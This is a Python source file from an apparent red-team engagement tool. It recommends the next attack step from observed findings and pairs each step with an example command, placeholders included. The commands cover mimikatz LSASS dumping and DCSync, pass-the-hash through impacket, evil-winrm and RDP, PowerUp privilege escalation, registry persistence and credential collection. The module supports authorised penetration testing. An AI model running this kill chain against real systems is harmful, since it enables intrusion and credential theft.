"""
invar.adapters.measurement.next_action
=======================================
Intelligence layer — derives prioritized next-action recommendations from the
current engagement Pearl set.

Invar observes what has been measured and what gaps remain.  This module
translates that observation into concrete operator guidance: which tool to run
next, against which target, and why — grounded entirely in observed gate_ids.

No execution.  No external calls.  Pure derivation from Pearls.

NextAction schema
-----------------
    priority    int   1=critical 2=high 3=medium 4=low (lower = more urgent)
    phase       str   "recon" | "enum" | "cred" | "lateral" | "privesc"
                      | "persist" | "collect"
    action      str   one-line description
    tool        str   recommended instrument
    command     str   example invocation (placeholders use <angle brackets>)
    reason      str   which observed gates drive this recommendation
    targets     list  node_keys this action applies to

Usage
-----
    from invar.adapters.measurement.next_action import NextActionEngine

    engine  = NextActionEngine(pearls)
    actions = engine.recommendations()
    for a in actions:
        print(f"[{a.priority}] {a.phase:<10}  {a.action}")
        print(f"             tool: {a.tool}")
        print(f"             cmd:  {a.command}")
        print(f"             why:  {a.reason}")
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, FrozenSet, List, Set

from invar.adapters.redteam.domain_model import ArtifactType, classify_gate_id
from invar.core.support_engine import Pearl


@dataclass
class NextAction:
    priority: int           # 1=critical, 2=high, 3=medium, 4=low
    phase:    str
    action:   str
    tool:     str
    command:  str
    reason:   str
    targets:  List[str] = field(default_factory=list)


class NextActionEngine:
    """
    Derives next-action recommendations from an engagement Pearl set.

    Rules are evaluated against:
        - which gate_id categories have been observed (artifact types)
        - which specific gate_ids are present
        - which targets have been seen
        - which phases are complete vs. missing

    Recommendations are sorted by priority (ascending = most urgent first),
    then by phase order.
    """

    _PHASE_ORDER = ["recon", "enum", "cred", "lateral", "privesc", "persist", "collect"]

    def __init__(self, pearls: List[Pearl]) -> None:
        self._pearls  = pearls
        self._gates   = {p.gate_id for p in pearls}
        self._targets = sorted({p.node_key for p in pearls if p.node_key != "unknown_host"})
        self._by_type = self._index_by_type()

    # ------------------------------------------------------------------
    # Public
    # ------------------------------------------------------------------

    def recommendations(self) -> List[NextAction]:
        """Return prioritized next-action list."""
        actions: List[NextAction] = []
        actions += self._recon_actions()
        actions += self._enum_actions()
        actions += self._cred_actions()
        actions += self._lateral_actions()
        actions += self._privesc_actions()
        actions += self._persist_actions()
        actions += self._collect_actions()
        actions.sort(key=lambda a: (a.priority, self._PHASE_ORDER.index(a.phase)
                                    if a.phase in self._PHASE_ORDER else 99))
        return actions

    # ------------------------------------------------------------------
    # Rule groups
    # ------------------------------------------------------------------

    def _recon_actions(self) -> List[NextAction]:
        actions = []
        if not self._has_type(ArtifactType.DISCOVERY_ARTIFACT):
            actions.append(NextAction(
                priority=1, phase="recon",
                action="Initial port and service discovery",
                tool="nmap",
                command="nmap -sV -sC -T4 --open -p 1-65535 -oX - <target>",
                reason="No discovery data observed yet",
                targets=self._targets,
            ))
        return actions

    def _enum_actions(self) -> List[NextAction]:
        actions = []
        has_smb   = bool(self._gates & {"discover_nmap_445", "discover_shares",
                                         "discover_users", "discover_groups"})
        has_enum  = bool(self._gates & {"discover_shares", "discover_users",
                                         "discover_groups", "discover_domain_policy"})
        has_web   = bool(self._gates & {"discover_nmap_http", "discover_nmap_https",
                                         "discover_web_server", "discover_web_dir"})
        has_nikto = bool(self._gates & {"discover_nikto_vuln", "discover_web_server",
                                         "discover_web_dir"})

        if has_smb and not has_enum:
            actions.append(NextAction(
                priority=2, phase="enum",
                action="SMB/NetBIOS enumeration — shares, users, groups, password policy",
                tool="enum4linux",
                command="enum4linux -a <target>",
                reason="SMB port observed (discover_nmap_445); no enumeration data yet",
                targets=self._targets,
            ))

        if has_web and not has_nikto:
            web_ports = self._web_ports_from_gates()
            for port in web_ports:
                ssl_flag = "-ssl " if port in (443, 8443) else ""
                actions.append(NextAction(
                    priority=2, phase="enum",
                    action=f"Web vulnerability scan on port {port}",
                    tool="nikto",
                    command=f"nikto -h <target> -p {port} {ssl_flag}".strip(),
                    reason="Web port observed; no nikto scan data yet",
                    targets=self._targets,
                ))

        return actions

    def _cred_actions(self) -> List[NextAction]:
        actions = []
        has_cred  = self._has_type(ArtifactType.CREDENTIAL_ARTIFACT)
        has_exec  = self._has_type(ArtifactType.EXECUTION_ARTIFACT)
        has_users = "discover_users" in self._gates
        has_ntlm  = "cred_hash_ntlm" in self._gates

        # If we have execution context (post-exploit foothold) but no creds yet
        if has_exec and not has_cred:
            actions.append(NextAction(
                priority=1, phase="cred",
                action="Harvest credentials from LSASS",
                tool="mimikatz",
                command="sekurlsa::logonpasswords",
                reason="Execution context observed; no credential data yet",
                targets=self._targets,
            ))
            actions.append(NextAction(
                priority=1, phase="cred",
                action="Check for privilege escalation vectors",
                tool="powerup",
                command="Invoke-AllChecks",
                reason="Execution context observed; privilege escalation not yet assessed",
                targets=self._targets,
            ))

        # If we have discovered users but no creds — suggest targeted credential work
        if has_users and not has_cred:
            actions.append(NextAction(
                priority=2, phase="cred",
                action="Target discovered user accounts for credential access",
                tool="mimikatz / responder",
                command="lsadump::dcsync /domain:<domain> /user:<username>",
                reason="User accounts observed (discover_users); credentials not yet harvested",
                targets=self._targets,
            ))

        # NTLM hashes observed but no lateral — crack or pass
        if has_ntlm and not self._has_type(ArtifactType.LATERAL_ARTIFACT):
            actions.append(NextAction(
                priority=1, phase="cred",
                action="Use harvested NTLM hash — crack offline or pass-the-hash",
                tool="hashcat / impacket",
                command="hashcat -m 1000 <hash> <wordlist>  OR  pth-winexe // <user>%<hash>",
                reason="cred_hash_ntlm observed; lateral movement not yet executed",
                targets=self._targets,
            ))

        return actions

    def _lateral_actions(self) -> List[NextAction]:
        actions = []
        has_cred    = self._has_type(ArtifactType.CREDENTIAL_ARTIFACT)
        has_lateral = self._has_type(ArtifactType.LATERAL_ARTIFACT)
        has_smb     = bool(self._gates & {"discover_nmap_445", "discover_shares"})
        has_winrm   = bool(self._gates & {"discover_nmap_winrm"})
        has_rdp     = bool(self._gates & {"discover_nmap_rdp"})
        has_ntlm    = "cred_hash_ntlm" in self._gates
        has_logonpw = "cred_mimikatz_logonpw" in self._gates or "cred_mimikatz_wdigest" in self._gates

        if has_cred and not has_lateral:
            if has_smb and has_ntlm:
                actions.append(NextAction(
                    priority=1, phase="lateral",
                    action="Pass-the-hash lateral movement via SMB",
                    tool="impacket-psexec / wmiexec",
                    command="impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>",
                    reason="cred_hash_ntlm + SMB observed; lateral movement not yet executed",
                    targets=self._targets,
                ))

            if has_smb and has_logonpw:
                actions.append(NextAction(
                    priority=1, phase="lateral",
                    action="Lateral movement with plaintext credentials via SMB",
                    tool="impacket-wmiexec / psexec",
                    command="impacket-wmiexec <domain>/<user>:'<password>'@<target>",
                    reason="Plaintext credentials observed; lateral movement not yet executed",
                    targets=self._targets,
                ))

            if has_winrm and has_cred:
                actions.append(NextAction(
                    priority=2, phase="lateral",
                    action="WinRM lateral movement with harvested credentials",
                    tool="evil-winrm",
                    command="evil-winrm -i <target> -u <user> -H <ntlm_hash>",
                    reason="discover_nmap_winrm + credentials observed",
                    targets=self._targets,
                ))

            if has_rdp and has_ntlm:
                actions.append(NextAction(
                    priority=2, phase="lateral",
                    action="RDP pass-the-hash (Restricted Admin mode)",
                    tool="xfreerdp",
                    command="xfreerdp /v:<target> /u:<user> /pth:<ntlm_hash>",
                    reason="discover_nmap_rdp + cred_hash_ntlm observed",
                    targets=self._targets,
                ))

        return actions

    def _privesc_actions(self) -> List[NextAction]:
        actions = []
        has_exec    = self._has_type(ArtifactType.EXECUTION_ARTIFACT)
        has_persist = self._has_type(ArtifactType.PERSISTENCE_ARTIFACT)
        has_lateral = self._has_type(ArtifactType.LATERAL_ARTIFACT)
        has_pu      = bool(self._gates & {"persist_checks", "persist_svc_unquoted",
                                           "persist_svc_modifiable", "persist_dll_hijack"})

        if (has_exec or has_lateral) and not has_persist and not has_pu:
            actions.append(NextAction(
                priority=2, phase="privesc",
                action="Enumerate privilege escalation vectors",
                tool="powerup",
                command="Invoke-AllChecks",
                reason="Execution/lateral context observed; no privesc enumeration yet",
                targets=self._targets,
            ))

        # Specific findings → specific abuse
        if "persist_svc_unquoted" in self._gates:
            actions.append(NextAction(
                priority=1, phase="privesc",
                action="Exploit unquoted service path",
                tool="powerup",
                command="Write-ServiceBinary -Name '<SvcName>' -Path '<HijackPath>'",
                reason="persist_svc_unquoted observed",
                targets=self._targets,
            ))

        if "persist_dll_hijack" in self._gates:
            actions.append(NextAction(
                priority=1, phase="privesc",
                action="Exploit DLL hijack opportunity",
                tool="powerup / custom",
                command="Write-HijackDll -DllPath '<path>'",
                reason="persist_dll_hijack observed",
                targets=self._targets,
            ))

        return actions

    def _persist_actions(self) -> List[NextAction]:
        actions = []
        has_exec    = self._has_type(ArtifactType.EXECUTION_ARTIFACT)
        has_persist = self._has_type(ArtifactType.PERSISTENCE_ARTIFACT)

        if has_exec and not has_persist:
            actions.append(NextAction(
                priority=3, phase="persist",
                action="Establish persistence mechanism",
                tool="msf / custom",
                command="run post/windows/manage/persistence_exe  OR  reg add HKCU\\...\\Run",
                reason="Execution context observed; no persistence established yet",
                targets=self._targets,
            ))

        return actions

    def _collect_actions(self) -> List[NextAction]:
        actions = []
        has_lateral = self._has_type(ArtifactType.LATERAL_ARTIFACT)
        has_persist = self._has_type(ArtifactType.PERSISTENCE_ARTIFACT)
        has_collect = self._has_type(ArtifactType.COLLECTION_ARTIFACT)

        if (has_lateral or has_persist) and not has_collect:
            actions.append(NextAction(
                priority=3, phase="collect",
                action="Collect sensitive files and data",
                tool="msf / robocopy",
                command="run post/windows/gather/credentials/credential_collector",
                reason="Lateral/persist context observed; no collection yet",
                targets=self._targets,
            ))

        return actions

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _index_by_type(self) -> Dict[str, Set[str]]:
        result: Dict[str, Set[str]] = {}
        for g in self._gates:
            t = classify_gate_id(g)
            result.setdefault(t, set()).add(g)
        return result

    def _has_type(self, artifact_type: str) -> bool:
        return bool(self._by_type.get(artifact_type))

    def _web_ports_from_gates(self) -> List[int]:
        from invar.adapters.measurement.tool_normalizer import _NMAP_PORT_GATE
        port_map = {
            "discover_nmap_http":  [80, 8080],
            "discover_nmap_https": [443, 8443],
        }
        ports: Set[int] = set()
        for gate, plist in port_map.items():
            if gate in self._gates:
                ports.update(plist)
        return sorted(ports)
